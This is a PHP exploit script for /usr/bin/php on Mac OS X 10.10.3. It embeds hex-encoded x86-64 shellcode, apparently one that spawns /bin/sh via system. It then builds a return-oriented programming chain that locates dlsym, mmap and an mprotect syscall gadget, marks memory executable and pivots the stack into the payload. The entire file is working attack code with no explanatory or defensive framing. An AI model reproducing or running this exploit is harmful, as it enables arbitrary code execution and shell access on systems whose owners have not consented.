<?
// for Mac OS X 10.10.3, /usr/bin/php ROP



require("pm.php");
require("pm_rop_osx.php");
function w64($x) { return ibuf($x,8); }
$all=alloc(4096);
$shellcode=hex2bin("415F4989E665488B0425080000004883C068488B204881EC08000100488D3D410000004883E4F0E82A000000488D3D3D0000004883E4F0FFD0488D3D2B0000004883E4F0E80D00000048C7C700000000FFD04C89F4C34889FE4831FF4883EF0241FFD7C373797374656D0065786974002F62696E2F736800");

$addr=rop_findexec();
nogc($addr);
$dlsym=getplt($addr,"_dlsym"); // get plt entry
nogc($dlsym);
$mmap_plt=getplt($addr,"_mmap"); // get plt entry
$mmap=r64(r32($mmap_plt+2) + $mmap_plt + 6);
nogc($mmap);
$mprotect=gadget(findmhfromaddr($mmap),"b84a000002"); // find b84a000002      	movl	$0x200004a, %eax -> mprotect syscall
nogc($mprotect);

function ig($a,$b) { return ibuf(gadget($a,$b),8); }
$arg1=ig($addr,"5fc3");
$arg2=ig($addr,"5ec3");
$arg3=ig(findmhfromaddr($mmap),"5ac3");


$stack  = $arg1;
$stack .= w64($all['ptr'] & (~0xFFF));
$stack .= $arg2;
$stack .= w64(4096*2);
$stack .= $arg3;
$stack .= w64(7);
$stack .= w64($mprotect);

$stack .= w64($all['ptr']);
$stack .= w64($dlsym);

$pad = str_repeat("z", 2048+ (0x10 - (strlen($shellcode) & 0xF)));
$payload = $shellcode . $pad . $stack;

memcpy($all, $payload);

jump(stackPivot($addr),ibuf(0,8).ibuf(0,8).ibuf(0,8).ig($addr,"5cc3").ibuf($all['ptr']+strlen($shellcode)+strlen($pad),8));

?>
